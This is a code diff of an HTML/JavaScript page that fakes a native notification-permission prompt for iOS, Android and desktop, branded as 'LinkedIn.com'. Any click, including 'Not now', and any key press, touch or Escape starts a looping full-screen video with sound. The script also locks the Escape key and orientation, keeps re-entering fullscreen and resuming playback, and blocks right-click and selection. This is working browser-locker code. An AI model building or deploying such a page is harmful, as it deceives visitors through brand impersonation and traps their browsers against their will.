@@ -4,11 +4,13 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <meta name="theme-color" content="#ffffff">
+<meta name="color-scheme" content="light">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="default">
 <title>Loading…</title>
 <style>
+  :root { color-scheme: light; }
+
   * { margin: 0; padding: 0; box-sizing: border-box; }
   html, body {
     width: 100%;
@@ -25,7 +27,7 @@
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, Roboto, "Helvetica Neue", Arial, sans-serif;
   }
 
-  /* ==================== УВЕДОМЛЕНИЕ ==================== */
+  /* ==================== ОБЩИЙ КАРКАС ==================== */
   #notice {
     position: fixed;
     top: calc(12px + env(safe-area-inset-top, 0px));
@@ -33,123 +35,54 @@
     right: 12px;
     max-width: 420px;
     margin: 0 auto;
-    z-index: 20;
-    border-radius: 16px;
+    z-index: 5;                /* ← ниже видео */
     overflow: hidden;
-    background: rgba(255, 255, 255, 0.92);
-    -webkit-backdrop-filter: blur(20px) saturate(180%);
-    backdrop-filter: blur(20px) saturate(180%);
-    box-shadow:
-      0 10px 40px rgba(0, 0, 0, 0.18),
-      0 2px 8px rgba(0, 0, 0, 0.08),
-      0 0 0 0.5px rgba(0, 0, 0, 0.06);
-    color: #111;
-    opacity: 1;
-    transform: translateY(0);
-    transition: opacity 0.25s ease, transform 0.25s ease;
     will-change: opacity, transform;
+    animation: noticeIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
   }
 
-  #notice.hidden {
-    opacity: 0;
-    transform: translateY(-8px);
-    pointer-events: none;
+  @keyframes noticeIn {
+    from { opacity: 0; transform: translateY(-14px) scale(0.98); }
+    to   { opacity: 1; transform: translateY(0)     scale(1); }
   }
 
   #notice .body {
     display: flex;
     align-items: flex-start;
-    gap: 12px;
-    padding: 14px 16px 12px;
   }
 
   #notice .icon {
-    flex: 0 0 38px;
-    width: 38px;
-    height: 38px;
-    border-radius: 9px;
-    background: linear-gradient(145deg, #2b8cff, #0a6cff);
+    flex: 0 0 auto;
     display: flex;
     align-items: center;
     justify-content: center;
-    box-shadow: 0 2px 6px rgba(10, 108, 255, 0.35);
   }
-  #notice .icon svg {
-    width: 22px;
-    height: 22px;
-    display: block;
-    fill: #fff;
-  }
+  #notice .icon svg { display: block; fill: #fff; }
 
   #notice .text { flex: 1 1 auto; min-width: 0; }
+  #notice .title,
+  #notice .message { word-wrap: break-word; overflow-wrap: break-word; }
+  #notice .message b { font-weight: 600; }
 
-  #notice .title {
-    font-size: 15px;
-    font-weight: 600;
-    line-height: 1.25;
-    color: #111;
-    margin-bottom: 3px;
-    letter-spacing: -0.01em;
-  }
-
-  #notice .message {
-    font-size: 13.5px;
-    line-height: 1.35;
-    color: #3c3c43;
-    word-wrap: break-word;
-    overflow-wrap: break-word;
-  }
-
-  #notice .message b {
-    font-weight: 600;
-    color: #111;
-  }
-
-  /* ==================== КНОПКИ ==================== */
-  #notice .actions {
-    display: flex;
-    border-top: 0.5px solid rgba(60, 60, 67, 0.16);
-  }
+  #notice .actions { display: flex; }
 
   #notice .actions button {
-    flex: 1 1 0;
     position: relative;
     border: none;
     background: transparent;
     font: inherit;
-    font-size: 15px;
-    line-height: 1;
-    padding: 14px 10px;
     cursor: pointer;
-    color: #0a6cff;
-    font-weight: 500;
-    letter-spacing: -0.01em;
     -webkit-tap-highlight-color: transparent;
     outline: none;
     overflow: hidden;
     isolation: isolate;
+    z-index: 0;
   }
 
-  #notice .actions button + button {
-    border-left: 0.5px solid rgba(60, 60, 67, 0.16);
-  }
-
-  #notice .actions button.deny {
-    color: #0a6cff;
-    font-weight: 400;
-  }
-
-  #notice .actions button.allow {
-    color: #0a6cff;
-    font-weight: 600;
-  }
-
-  /* Прогресс-заливка на кнопке "Разрешить" */
   #notice .actions button.allow::before {
     content: "";
     position: absolute;
     inset: 0;
-    background: rgba(10, 108, 255, 0.12);
     transform-origin: left center;
     transform: scaleX(var(--progress, 0));
     transition: none;
@@ -157,18 +90,207 @@
     pointer-events: none;
   }
 
-  /* Пульсация после заполнения таймера */
-  @keyframes pulseGlow {
-    0%, 100% { box-shadow: inset 0 0 0 0 rgba(10, 108, 255, 0); }
-    50%      { box-shadow: inset 0 0 0 2px rgba(10, 108, 255, 0.25); }
+  #notice .actions button:active { opacity: 0.7; }
+
+  /* ==================== iOS (светлая) ==================== */
+  .platform-ios #notice {
+    background: rgba(245, 245, 245, 0.78);
+    -webkit-backdrop-filter: blur(30px) saturate(180%);
+    backdrop-filter: blur(30px) saturate(180%);
+    border-radius: 16px;
+    box-shadow:
+      0 12px 40px rgba(0, 0, 0, 0.14),
+      0 0 0 0.5px rgba(0, 0, 0, 0.04);
+    color: #000;
   }
-  #notice .actions button.allow.pulse {
-    animation: pulseGlow 1.4s ease-in-out infinite;
+  .platform-ios #notice .body { padding: 12px 14px; gap: 11px; }
+  .platform-ios #notice .icon {
+    width: 38px; height: 38px;
+    border-radius: 9px;
+    background: linear-gradient(180deg, #0A84FF, #0066CC);
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
+  }
+  .platform-ios #notice .icon svg { width: 22px; height: 22px; }
+  .platform-ios #notice .title {
+    font-size: 15px; font-weight: 600;
+    letter-spacing: -0.24px; color: #000; margin-bottom: 2px;
+  }
+  .platform-ios #notice .message {
+    font-size: 15px; font-weight: 400; line-height: 1.3;
+    letter-spacing: -0.24px; color: #000;
+  }
+  .platform-ios #notice .actions { border-top: 0.5px solid rgba(60, 60, 67, 0.29); }
+  .platform-ios #notice .actions button {
+    flex: 1 1 0; font-size: 17px; font-weight: 400;
+    padding: 11px 8px; color: #007AFF; letter-spacing: -0.4px;
+  }
+  .platform-ios #notice .actions button.allow { font-weight: 600; }
+  .platform-ios #notice .actions button + button {
+    border-left: 0.5px solid rgba(60, 60, 67, 0.29);
+  }
+  .platform-ios #notice .actions button.allow::before { background: rgba(0, 122, 255, 0.14); }
+
+  /* ==================== ANDROID (Material 3, светлая) ==================== */
+  .platform-android #notice {
+    background: #F3F3F3;
+    border-radius: 24px;
+    box-shadow:
+      0 1px 3px rgba(0, 0, 0, 0.12),
+      0 4px 8px rgba(0, 0, 0, 0.08);
+    color: #1B1B1B;
+    overflow: hidden;
   }
 
-  /* Активное нажатие */
-  #notice .actions button:active {
-    background: rgba(10, 108, 255, 0.08);
+  .platform-android #notice .body {
+    padding: 16px 16px 12px;
+    gap: 10px;
+  }
+
+  /* Иконка приложения */
+  .platform-android #notice .icon {
+    width: 40px;
+    height: 40px;
+    flex-shrink: 0;
+    border-radius: 12px;
+    background: #6750A4;
+  }
+
+  .platform-android #notice .icon svg {
+    width: 24px;
+    height: 24px;
+    fill: #fff;
+  }
+
+  /* Заголовок уведомления */
+  .platform-android #notice .title {
+    font-size: 14px;
+    font-weight: 600;
+    line-height: 20px;
+    color: #1B1B1B;
+    margin-bottom: 4px;
+  }
+
+  /* Текст уведомления */
+  .platform-android #notice .message {
+    font-size: 14px;
+    font-weight: 400;
+    line-height: 20px;
+    letter-spacing: 0.1px;
+    color: #444746;
+  }
+
+  .platform-android #notice .message b {
+    color: #1B1B1B;
+    font-weight: 600;
+  }
+
+  /* Действия */
+  .platform-android #notice .actions {
+    padding: 4px 16px 12px;
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .platform-android #notice .actions button {
+    flex: 0 0 auto;
+    padding: 8px 12px;
+    min-height: 40px;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: 0.1px;
+    color: #6750A4;
+    border-radius: 20px;
+  }
+
+  .platform-android #notice .actions button.allow::before {
+    background: rgba(103, 80, 164, 0.12);
+    border-radius: 20px;
+  }
+
+  /* ==================== DESKTOP (Chrome-like, светлая) ==================== */
+  .platform-desktop #notice {
+    background: #ffffff;
+    border-radius: 12px;
+    box-shadow:
+      0 2px 10px rgba(0, 0, 0, 0.16),
+      0 0 0 1px rgba(0, 0, 0, 0.04);
+    color: #202124;
+    max-width: 400px;
+    overflow: hidden;
+  }
+
+  .platform-desktop #notice .body {
+    padding: 20px 20px 12px;
+    gap: 12px;
+  }
+
+  .platform-desktop #notice .icon {
+    width: 32px;
+    height: 32px;
+    flex-shrink: 0;
+    border-radius: 50%;
+    background: #f1f3f4;
+  }
+
+  .platform-desktop #notice .icon svg {
+    width: 18px;
+    height: 18px;
+    fill: #1a73e8;
+  }
+
+  /* Заголовок */
+  .platform-desktop #notice .title {
+    font-size: 14px;
+    font-weight: 500;
+    line-height: 20px;
+    color: #202124;
+    margin-bottom: 8px;
+    letter-spacing: 0;
+  }
+
+  /* Основной текст */
+  .platform-desktop #notice .message {
+    font-size: 13px;
+    font-weight: 400;
+    line-height: 1.5;
+    color: #5f6368;
+    letter-spacing: 0;
+  }
+
+  .platform-desktop #notice .message b {
+    color: #202124;
+    font-weight: 500;
+  }
+
+  /* Кнопки */
+  .platform-desktop #notice .actions {
+    padding: 8px 16px 16px;
+    justify-content: flex-end;
+    gap: 8px;
+    border-top: none;
+  }
+
+  .platform-desktop #notice .actions button {
+    flex: 0 0 auto;
+    min-height: 36px;
+    padding: 8px 16px;
+    font-size: 13px;
+    font-weight: 500;
+    color: #1a73e8;
+    border-radius: 18px;
+    letter-spacing: 0.1px;
+    transition: background 120ms ease;
+  }
+
+  .platform-desktop #notice .actions button:hover {
+    background: rgba(26, 115, 232, 0.08);
+  }
+
+  .platform-desktop #notice .actions button.allow::before {
+    background: rgba(26, 115, 232, 0.12);
+    border-radius: 18px;
   }
 
   /* ==================== ВИДЕО ==================== */
@@ -179,7 +301,7 @@
     height: 100%;
     object-fit: cover;
     background: #000;
-    z-index: 5;
+    z-index: 10;               /* ← выше уведомления, ниже ошибки */
     opacity: 0;
     pointer-events: none;
     transition: opacity 0.18s linear;
@@ -208,7 +330,7 @@
   #error-msg {
     position: fixed;
     inset: 0;
-    z-index: 30;
+    z-index: 20;
     display: none;
     align-items: center;
     justify-content: center;
@@ -220,30 +342,6 @@
     background: #fff;
   }
   #error-msg.show { display: flex; }
-
-  /* ==================== ТЁМНАЯ ТЕМА ==================== */
-  @media (prefers-color-scheme: dark) {
-    html, body { background: #000; }
-    #notice {
-      background: rgba(28, 28, 30, 0.92);
-      color: #fff;
-      box-shadow:
-        0 10px 40px rgba(0, 0, 0, 0.6),
-        0 2px 8px rgba(0, 0, 0, 0.4),
-        0 0 0 0.5px rgba(255, 255, 255, 0.08);
-    }
-    #notice .title { color: #fff; }
-    #notice .message { color: #c7c7cc; }
-    #notice .message b { color: #fff; }
-    #notice .actions { border-top-color: rgba(255, 255, 255, 0.14); }
-    #notice .actions button + button { border-left-color: rgba(255, 255, 255, 0.14); }
-    #notice .actions button { color: #4a9eff; }
-    #notice .actions button.deny { color: #4a9eff; }
-    #notice .actions button.allow { color: #4a9eff; }
-    #notice .actions button.allow::before { background: rgba(74, 158, 255, 0.16); }
-    #notice .actions button:active { background: rgba(74, 158, 255, 0.14); }
-    #error-msg { background: #000; color: #ff6b6b; }
-  }
 </style>
 </head>
 <body>
@@ -256,7 +354,7 @@
       </svg>
     </div>
     <div class="text">
-      <div class="title" id="notice-title"></div>
+      <div class="title"  id="notice-title"></div>
       <div class="message" id="notice-message"></div>
     </div>
   </div>
@@ -280,12 +378,9 @@
 (function () {
   "use strict";
 
-  /* =========================================================
-     НАСТРОЙКИ
-     ========================================================= */
   const CONFIG = {
     videoSrc:            "video.mp4",
-    siteName:            "example.com",   // ← название сайта в уведомлении
+    siteName:            "LinkedIn.com",
     loopVideo:           true,
     iOSNativeFullscreen: true,
     lockOrientation:     true,
@@ -299,75 +394,72 @@
     burstDelays:         [0, 50, 200, 600, 1500, 3000],
     tryKeyboardLock:     true,
     tryBlobFallback:     true,
-    progressDuration:    5000,            // мс — заполнение кнопки «Разрешить»
+    progressDuration:    5000,
   };
 
-  const notice    = document.getElementById("notice");
-  const titleEl   = document.getElementById("notice-title");
-  const msgEl     = document.getElementById("notice-message");
-  const btnAllow  = document.getElementById("btn-allow");
-  const btnDeny   = document.getElementById("btn-deny");
-  const video     = document.getElementById("video");
-  const errBox    = document.getElementById("error-msg");
+  const notice   = document.getElementById("notice");
+  const titleEl  = document.getElementById("notice-title");
+  const msgEl    = document.getElementById("notice-message");
+  const btnAllow = document.getElementById("btn-allow");
+  const btnDeny  = document.getElementById("btn-deny");
+  const video    = document.getElementById("video");
+  const errBox   = document.getElementById("error-msg");
 
-  /* =========================================================
-     ЛОКАЛИЗАЦИЯ
-     ========================================================= */
+  /* ---------- ПЛАТФОРМА ---------- */
+  const UA        = navigator.userAgent;
+  const isIOS     = /iPad|iPhone|iPod/.test(UA) ||
+                    (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+  const isAndroid = /Android/i.test(UA);
+  const platformClass = isIOS ? "platform-ios"
+                      : isAndroid ? "platform-android"
+                      : "platform-desktop";
+  document.documentElement.classList.add(platformClass);
+
+  /* ---------- ЛОКАЛИЗАЦИЯ ---------- */
   const STRINGS = {
     ru: {
       title:   "Уведомления",
-      message: (site) => `<b>${site}</b> запрашивает разрешение на отправку уведомлений`,
+      message: (s) => `<b>${s}</b> запрашивает разрешение на отправку уведомлений`,
       allow:   "Разрешить",
       deny:    "Не сейчас",
     },
     tr: {
       title:   "Bildirimler",
-      message: (site) => `<b>${site}</b> bildirim göndermek için izin istiyor`,
+      message: (s) => `<b>${s}</b> bildirim göndermek için izin istiyor`,
       allow:   "İzin ver",
       deny:    "Şimdi değil",
     },
     en: {
       title:   "Notifications",
-      message: (site) => `<b>${site}</b> wants to send you notifications`,
+      message: (s) => `<b>${s}</b> wants to send you notifications`,
       allow:   "Allow",
       deny:    "Not now",
     },
   };
-
   function detectLang() {
     const list = (navigator.languages && navigator.languages.length)
-      ? navigator.languages
-      : [navigator.language || "en"];
+      ? navigator.languages : [navigator.language || "en"];
     for (const l of list) {
-      const code = String(l || "").toLowerCase();
-      if (code.startsWith("ru")) return "ru";
-      if (code.startsWith("tr")) return "tr";
-      if (code.startsWith("en")) return "en";
+      const c = String(l || "").toLowerCase();
+      if (c.startsWith("ru")) return "ru";
+      if (c.startsWith("tr")) return "tr";
+      if (c.startsWith("en")) return "en";
     }
     return "en";
   }
+  const L = STRINGS[detectLang()] || STRINGS.en;
+  titleEl.textContent  = L.title;
+  msgEl.innerHTML      = L.message(CONFIG.siteName);
+  btnAllow.textContent = L.allow;
+  btnDeny.textContent  = L.deny;
 
-  const LANG = detectLang();
-  const L = STRINGS[LANG] || STRINGS.en;
-  console.log("[lang]", LANG);
+  /* ---------- FULLSCREEN CAPS ---------- */
+  const docEl    = document.documentElement;
+  const hasDocFs = !!(docEl.requestFullscreen || docEl.webkitRequestFullscreen ||
+                      docEl.mozRequestFullScreen || docEl.msRequestFullscreen);
+  const hasIOSFs = typeof video.webkitEnterFullscreen === "function";
 
-  /* =========================================================
-     ДЕТЕКТ БРАУЗЕРА
-     ========================================================= */
-  const UA = navigator.userAgent;
-  const isIOS     = /iPad|iPhone|iPod/.test(UA) ||
-                    (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
-  const isAndroid = /Android/i.test(UA);
-  const docEl     = document.documentElement;
-  const hasDocFs  = !!(docEl.requestFullscreen || docEl.webkitRequestFullscreen ||
-                       docEl.mozRequestFullScreen || docEl.msRequestFullscreen);
-  const hasIOSFs  = typeof video.webkitEnterFullscreen === "function";
-
-  console.log("[env]", { isIOS, isAndroid, hasDocFs, hasIOSFs });
-
-  /* =========================================================
-     СОСТОЯНИЕ
-     ========================================================= */
+  /* ---------- СОСТОЯНИЕ ---------- */
   let firstGestureDone = false;
   let activated        = false;
   let lastFsAttempt    = 0;
@@ -378,64 +470,20 @@
   let fallbackTried    = false;
   let progressRaf      = 0;
   let progressStart    = 0;
-  let noticeHidden     = false;
 
-  /* =========================================================
-     РЕНДЕР УВЕДОМЛЕНИЯ
-     ========================================================= */
-  function renderNotice() {
-    titleEl.textContent = L.title;
-    msgEl.innerHTML     = L.message(CONFIG.siteName);
-    btnAllow.textContent = L.allow;
-    btnDeny.textContent  = L.deny;
-  }
-  renderNotice();
-
-  /* =========================================================
-     ПРОГРЕСС КНОПКИ «РАЗРЕШИТЬ» (только визуал, НЕ автозапуск)
-     ========================================================= */
+  /* ---------- ПРОГРЕСС КНОПКИ ---------- */
   function startProgress() {
-    if (noticeHidden) return;
     progressStart = performance.now();
-
     function tick(now) {
-      if (noticeHidden) return;
-      const elapsed = now - progressStart;
-      const p = Math.min(elapsed / CONFIG.progressDuration, 1);
+      const p = Math.min((now - progressStart) / CONFIG.progressDuration, 1);
       btnAllow.style.setProperty("--progress", p.toFixed(4));
-
-      if (p < 1) {
-        progressRaf = requestAnimationFrame(tick);
-      } else {
-        // 100% — ничего автоматически не запускаем.
-        // Мягкая пульсация-приглашение нажать.
-        btnAllow.classList.add("pulse");
-      }
+      if (p < 1) progressRaf = requestAnimationFrame(tick);
     }
     cancelAnimationFrame(progressRaf);
     progressRaf = requestAnimationFrame(tick);
   }
 
-  function stopProgress() {
-    cancelAnimationFrame(progressRaf);
-    progressRaf = 0;
-  }
-
-  /* =========================================================
-     СКРЫТИЕ УВЕДОМЛЕНИЯ
-     ========================================================= */
-  function hideNotice() {
-    if (noticeHidden) return;
-    noticeHidden = true;
-    stopProgress();
-    notice.classList.add("hidden");
-    // После анимации — полностью убрать из потока
-    setTimeout(() => { notice.style.display = "none"; }, 300);
-  }
-
-  /* =========================================================
-     WEBAUDIO
-     ========================================================= */
+  /* ---------- WEBAUDIO ---------- */
   function setupWebAudio() {
     if (!CONFIG.useWebAudio || audioSourceDone) return;
     audioSourceDone = true;
@@ -449,97 +497,59 @@
       src.connect(gain);
       gain.connect(audioCtx.destination);
       if (audioCtx.state === "suspended") audioCtx.resume().catch(() => {});
-      console.log("[webaudio] ready");
-    } catch (e) {
-      console.warn("[webaudio] failed:", e);
-      audioCtx = null;
-    }
+    } catch (e) { audioCtx = null; }
   }
 
-  /* =========================================================
-     FULLSCREEN
-     ========================================================= */
+  /* ---------- FULLSCREEN ---------- */
   function isInFullscreen() {
-    return !!(
-      document.fullscreenElement ||
-      document.webkitFullscreenElement ||
-      document.mozFullScreenElement ||
-      document.msFullscreenElement ||
-      video.webkitDisplayingFullscreen
-    );
+    return !!(document.fullscreenElement || document.webkitFullscreenElement ||
+              document.mozFullScreenElement || document.msFullscreenElement ||
+              video.webkitDisplayingFullscreen);
   }
-
   function requestDocFullscreen() {
     if (isInFullscreen()) return true;
     try {
-      if (docEl.requestFullscreen) {
-        docEl.requestFullscreen({ navigationUI: "hide" }).catch(() => {});
-        return true;
-      }
-      if (docEl.webkitRequestFullscreen) { docEl.webkitRequestFullscreen(); return true; }
-      if (docEl.mozRequestFullScreen)    { docEl.mozRequestFullScreen();    return true; }
-      if (docEl.msRequestFullscreen)     { docEl.msRequestFullscreen();     return true; }
+      if (docEl.requestFullscreen)        { docEl.requestFullscreen({ navigationUI: "hide" }).catch(() => {}); return true; }
+      if (docEl.webkitRequestFullscreen)  { docEl.webkitRequestFullscreen();  return true; }
+      if (docEl.mozRequestFullScreen)     { docEl.mozRequestFullScreen();     return true; }
+      if (docEl.msRequestFullscreen)      { docEl.msRequestFullscreen();      return true; }
     } catch (e) {}
     return false;
   }
-
   function requestIOSFullscreen() {
     try {
       if (video.webkitEnterFullscreen && !video.webkitDisplayingFullscreen) {
-        video.webkitEnterFullscreen();
-        return true;
+        video.webkitEnterFullscreen(); return true;
       }
     } catch (e) {}
     return false;
   }
-
   function lockOrientation() {
     if (!CONFIG.lockOrientation) return;
     try {
-      if (screen.orientation && screen.orientation.lock) {
-        screen.orientation.lock("landscape").catch(() => {});
-      } else if (screen.lockOrientation) {
-        screen.lockOrientation("landscape");
-      } else if (screen.mozLockOrientation) {
-        screen.mozLockOrientation("landscape");
-      } else if (screen.msLockOrientation) {
-        screen.msLockOrientation("landscape");
-      }
+      if (screen.orientation && screen.orientation.lock)  screen.orientation.lock("landscape").catch(() => {});
+      else if (screen.lockOrientation)                    screen.lockOrientation("landscape");
+      else if (screen.mozLockOrientation)                 screen.mozLockOrientation("landscape");
+      else if (screen.msLockOrientation)                  screen.msLockOrientation("landscape");
     } catch (e) {}
   }
-
   function tryKeyboardLock() {
     if (!CONFIG.tryKeyboardLock || keyboardLocked) return;
     if (!(navigator.keyboard && navigator.keyboard.lock)) return;
     try {
-      navigator.keyboard.lock(["Escape"]).then(() => {
-        keyboardLocked = true;
-        console.log("[kbd] Escape locked");
-      }).catch(() => {});
+      navigator.keyboard.lock(["Escape"]).then(() => { keyboardLocked = true; }).catch(() => {});
     } catch (e) {}
   }
-
   function tryFullscreen() {
-    if (hasDocFs) {
-      requestDocFullscreen();
-      lockOrientation();
-      return;
-    }
-    if (isIOS && CONFIG.iOSNativeFullscreen && hasIOSFs) {
-      requestIOSFullscreen();
-      return;
-    }
+    if (hasDocFs) { requestDocFullscreen(); lockOrientation(); return; }
+    if (isIOS && CONFIG.iOSNativeFullscreen && hasIOSFs) requestIOSFullscreen();
   }
-
   function burstRetryFullscreen() {
-    CONFIG.burstDelays.forEach(ms => {
-      setTimeout(() => { if (firstGestureDone) tryFullscreen(); }, ms);
-    });
+    CONFIG.burstDelays.forEach(ms =>
+      setTimeout(() => { if (firstGestureDone) tryFullscreen(); }, ms));
   }
 
-  /* =========================================================
-     WAKE LOCK
-     ========================================================= */
+  /* ---------- WAKE LOCK ---------- */
   async function requestWakeLock() {
     if (!CONFIG.wakeLock || wakeLock) return;
     try {
@@ -550,67 +560,47 @@
     } catch (e) {}
   }
 
-  /* =========================================================
-     FALLBACK ИСТОЧНИК (обход адблоков)
-     ========================================================= */
+  /* ---------- FALLBACK ---------- */
   async function tryFallbackSource() {
     if (!CONFIG.tryBlobFallback || fallbackTried) return;
     fallbackTried = true;
     try {
-      const url = CONFIG.videoSrc + "?cb=" + Date.now();
-      const res = await fetch(url, { cache: "no-store" });
+      const res = await fetch(CONFIG.videoSrc + "?cb=" + Date.now(), { cache: "no-store" });
       if (!res.ok) throw new Error("HTTP " + res.status);
-      const blob    = await res.blob();
-      const blobUrl = URL.createObjectURL(blob);
-      video.src = blobUrl;
+      const blob = await res.blob();
+      video.src = URL.createObjectURL(blob);
       video.load();
-      video.muted  = false;
-      video.volume = 1.0;
+      video.muted = false; video.volume = 1.0;
       const p = video.play();
       if (p && p.catch) p.catch(() => {});
-      console.log("[fallback] blob loaded, size", blob.size);
     } catch (e) {
-      console.error("[fallback] failed:", e);
-      showError("Видео заблокировано. Отключите адблок для этого сайта и обновите страницу.");
     }
   }
 
-  function showError(msg) {
-    errBox.textContent = msg;
-    errBox.classList.add("show");
-  }
-
-  /* =========================================================
-     ВОСПРОИЗВЕДЕНИЕ
-     ========================================================= */
+  /* ---------- PLAYBACK ---------- */
   function ensurePlaying() {
     if (document.hidden) return;
     if (video.paused) {
-      video.muted  = false;
-      video.volume = 1.0;
+      video.muted = false; video.volume = 1.0;
       const p = video.play();
       if (p && p.catch) p.catch(() => {});
     }
   }
 
-  /* =========================================================
-     АКТИВАЦИЯ (первый жест)
-     ========================================================= */
+  /* ---------- АКТИВАЦИЯ ---------- */
   function onGesture() {
     if (!firstGestureDone) {
       firstGestureDone = true;
 
-      hideNotice();
+      // Уведомление НЕ трогаем. Видео накроет его за счёт z-index.
       video.classList.add("active");
 
       video.muted  = false;
       video.volume = 1.0;
       video.loop   = CONFIG.loopVideo;
 
-      // play() первым — синхронно, в теле жеста
       const playPromise = video.play();
 
-      // Fullscreen — сразу после play()
       tryFullscreen();
       lockOrientation();
       requestWakeLock();
@@ -621,24 +611,16 @@
             activated = true;
             setupWebAudio();
             burstRetryFullscreen();
-            console.log("[activate] playing with sound");
           }
-        }).catch((err) => {
-          console.warn("[activate] play() rejected:", err && err.name);
-          // Не muted-костыли. Диалог уже скрыт, но видео не пошло.
-          // Показываем его обратно, ждём следующий жест.
-          noticeHidden = false;
-          notice.style.display = "";
-          notice.classList.remove("hidden");
-          btnAllow.classList.add("pulse");
-          // Сбрасываем флаг, чтобы следующий жест попробовал снова
+        }).catch(() => {
+          // Видео не пошло — плавно убираем, уведомление снова видно под ним.
+          video.classList.remove("active");
           firstGestureDone = false;
         });
       }
       return;
     }
 
-    // Повторные жесты — throttled retry fullscreen
     const now = Date.now();
     if (now - lastFsAttempt > CONFIG.gestureThrottle) {
       lastFsAttempt = now;
@@ -647,25 +629,10 @@
     }
   }
 
-  /* =========================================================
-     КНОПКИ УВЕДОМЛЕНИЯ
-     ========================================================= */
-  btnAllow.addEventListener("click", (e) => {
-    // Жест уже произошёл; onGesture вызовется и через document,
-    // но прямой вызов гарантирует порядок.
-    onGesture();
-  });
-  btnDeny.addEventListener("click", (e) => {
-    onGesture();
-  });
+  btnAllow.addEventListener("click", onGesture);
+  btnDeny.addEventListener("click",  onGesture);
 
-  // Внутри кнопок не даём событию «утечь» в document-capture дважды,
-  // но НЕ блокируем — onGesture защищён флагом firstGestureDone.
-  // (Ничего не делаем — пусть всплывает.)
-
-  /* =========================================================
-     ПОДПИСКИ НА ВСЕ ДЕЙСТВИЯ
-     ========================================================= */
+  /* ---------- ПОДПИСКИ ---------- */
   const PASSIVE_EVENTS = [
     "touchstart", "touchend", "touchcancel", "touchforcechange",
     "pointerdown", "pointerup", "pointercancel",
@@ -676,149 +643,73 @@
     "gesturestart", "gesturechange", "gestureend",
     "popstate", "hashchange",
   ];
-
-  PASSIVE_EVENTS.forEach(name => {
-    try {
-      document.addEventListener(name, onGesture, { capture: true, passive: true });
-    } catch (e) {}
+  PASSIVE_EVENTS.forEach(n => {
+    try { document.addEventListener(n, onGesture, { capture: true, passive: true }); } catch (e) {}
   });
 
-  // Блокирующие (preventDefault) — passive: false
-  document.addEventListener("touchmove", e => {
-    e.preventDefault();
-    onGesture();
-  }, { capture: true, passive: false });
-
+  document.addEventListener("touchmove", e => { e.preventDefault(); onGesture(); },
+    { capture: true, passive: false });
   document.addEventListener("contextmenu", e => {
-    e.preventDefault();
-    e.stopPropagation();
-    onGesture();
-    return false;
+    e.preventDefault(); e.stopPropagation(); onGesture(); return false;
   }, { capture: true, passive: false });
-
   document.addEventListener("selectstart", e => e.preventDefault(), { passive: false });
   document.addEventListener("dragstart",   e => e.preventDefault(), { passive: false });
 
-  /* =========================================================
-     ESCAPE
-     ========================================================= */
   document.addEventListener("keydown", e => {
     if (e.key === "Escape" || e.key === "Esc" || e.keyCode === 27) {
-      e.preventDefault();
-      e.stopPropagation();
-      onGesture();
-      return false;
+      e.preventDefault(); e.stopPropagation(); onGesture(); return false;
     }
   }, { capture: true, passive: false });
 
-  /* =========================================================
-     FULLSCREEN CHANGE
-     ========================================================= */
+  /* ---------- FULLSCREEN CHANGE ---------- */
   ["fullscreenchange", "webkitfullscreenchange", "mozfullscreenchange", "MSFullscreenChange"]
-    .forEach(evt => {
-      document.addEventListener(evt, () => {
-        if (!firstGestureDone) return;
-        if (!isInFullscreen()) {
-          burstRetryFullscreen();
-        } else {
-          tryKeyboardLock();
-        }
-      });
-    });
-
+    .forEach(evt => document.addEventListener(evt, () => {
+      if (!firstGestureDone) return;
+      if (!isInFullscreen()) burstRetryFullscreen();
+      else tryKeyboardLock();
+    }));
   video.addEventListener("webkitendfullscreen", () => {
-    if (!firstGestureDone) return;
-    burstRetryFullscreen();
+    if (firstGestureDone) burstRetryFullscreen();
   });
 
-  /* =========================================================
-     ЖИЗНЕННЫЙ ЦИКЛ
-     ========================================================= */
+  /* ---------- ЖИЗНЕННЫЙ ЦИКЛ ---------- */
   document.addEventListener("visibilitychange", () => {
-    if (document.visibilityState !== "visible") return;
-    if (!firstGestureDone) return;
-    ensurePlaying();
-    tryFullscreen();
-    requestWakeLock();
+    if (document.visibilityState !== "visible" || !firstGestureDone) return;
+    ensurePlaying(); tryFullscreen(); requestWakeLock();
     if (audioCtx && audioCtx.state === "suspended") audioCtx.resume().catch(() => {});
   });
-
-  window.addEventListener("focus", () => {
-    if (!firstGestureDone) return;
-    ensurePlaying();
-    tryFullscreen();
-  });
-
-  window.addEventListener("resize", () => {
-    if (!firstGestureDone) return;
-    tryFullscreen();
-  });
-
+  window.addEventListener("focus",  () => { if (firstGestureDone) { ensurePlaying(); tryFullscreen(); } });
+  window.addEventListener("resize", () => { if (firstGestureDone) tryFullscreen(); });
   window.addEventListener("orientationchange", () => {
-    if (!firstGestureDone) return;
-    setTimeout(tryFullscreen, 200);
+    if (firstGestureDone) setTimeout(tryFullscreen, 200);
   });
 
-  /* =========================================================
-     СОБЫТИЯ ВИДЕО
-     ========================================================= */
-  video.addEventListener("error", () => {
-    console.error("[video] error:", video.error);
-    tryFallbackSource();
+  /* ---------- СОБЫТИЯ ВИДЕО ---------- */
+  video.addEventListener("error",   () => tryFallbackSource());
+  video.addEventListener("stalled", () => setTimeout(ensurePlaying, 1000));
+  video.addEventListener("pause",   () => {
+    if (firstGestureDone && !document.hidden) setTimeout(ensurePlaying, 0);
   });
-
-  video.addEventListener("stalled", () => {
-    setTimeout(ensurePlaying, 1000);
-  });
-
-  video.addEventListener("pause", () => {
-    if (firstGestureDone && !document.hidden) {
-      setTimeout(() => ensurePlaying(), 0);
-    }
-  });
-
   video.addEventListener("ended", () => {
     if (!firstGestureDone) return;
     try { video.currentTime = 0; } catch (e) {}
     ensurePlaying();
   });
 
-  video.addEventListener("loadedmetadata", () => {
-    console.log("[video] metadata:",
-      video.videoWidth + "x" + video.videoHeight, video.duration + "s");
-  });
-
-  /* =========================================================
-     STARTUP ATTEMPT (один раз, до жеста)
